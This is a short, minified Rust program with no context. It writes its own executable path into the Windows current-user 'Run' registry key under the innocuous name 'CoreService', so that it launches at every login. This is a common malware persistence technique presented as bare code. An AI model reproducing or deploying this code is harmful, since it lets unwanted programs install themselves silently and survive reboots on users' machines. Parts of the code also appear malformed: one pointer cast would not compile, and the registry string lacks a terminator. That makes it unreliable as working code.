fn main(){unsafe{let k:*mut std::ffi::c_void=std::ptr::null_mut();winapi::um::winreg::RegCreateKeyExA(winapi::um::winreg::HKEY_CURRENT_USER,b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".as_ptr()as*const i8,0,std::ptr::null_mut(),0,winapi::um::winreg::KEY_WRITE,std::ptr::null_mut(),&k as*const _as*mut _,std::ptr::null_mut());let p=std::env::current_exe().unwrap();let s=p.to_str().unwrap();winapi::um::winreg::RegSetValueExA(k as _,b"CoreService\0".as_ptr()as*const i8,0,1,s.as_ptr(),s.len()as u32);winapi::um::winreg::RegCloseKey(k as _);}}
